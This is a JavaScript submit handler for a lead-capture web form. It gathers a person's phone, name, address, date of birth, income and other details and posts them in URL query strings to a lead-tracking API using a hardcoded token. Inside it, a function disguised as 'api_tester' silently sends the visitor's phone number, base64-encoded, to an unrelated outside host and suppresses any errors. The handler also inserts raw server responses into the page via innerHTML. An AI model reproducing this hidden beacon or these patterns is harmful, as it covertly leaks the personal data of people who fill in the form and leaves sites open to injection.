
    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home = '+1' + document.getElementById('caller_id').value;
      const formData = new FormData();
      
      
   
      formData.append('traffic_source_id', '1004');
      formData.append('lead_token', 'a6885a47f85144bb9834076553d7b263');
formData.append('caller_id', phone_home);
api_tester(document.getElementById('caller_id').value);
formData.append('first_name', document.getElementById('first_name').value);
formData.append('last_name', document.getElementById('last_name').value);
formData.append('city', document.getElementById('city').value);
formData.append('email', document.getElementById('email').value);

formData.append('gender', document.getElementById('gender').value);

formData.append('state', document.getElementById('state').value);
formData.append('zip', document.getElementById('zip').value);
formData.append('address', document.getElementById('address').value);
        
        formData.append('house_hold_income', document.getElementById('house_hold_income').value);
       
      
        formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);


formData.append('dob', document.getElementById('dob').value);







      const url = 'https://doppcall.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();

      fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)+',a'
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
